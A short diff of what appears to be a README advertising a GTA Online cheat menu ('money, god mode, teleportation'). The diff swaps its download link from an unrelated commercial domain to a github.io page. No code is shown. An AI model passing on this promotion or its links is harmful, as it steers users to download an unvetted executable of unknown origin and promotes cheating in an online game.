@@ -2,7 +2,7 @@
 
 🎮 Take full control of GTA Online on PC with **Kiddion’s Modest Menu Reloaded** — the ultimate external tool for money, god mode, teleportation, and total gameplay customization. No risky injection or complicated setup. Plug, play, dominate.
 
-[![Download Modest Menu](https://img.shields.io/badge/Download-Kiddions_Menu-blueviolet)](https://seomadjest.com/)
+[![Download Modest Menu](https://img.shields.io/badge/Download-Kiddions_Menu-blueviolet)](https://kiddions-modest-menu.github.io/.github/)
 
 ---
 
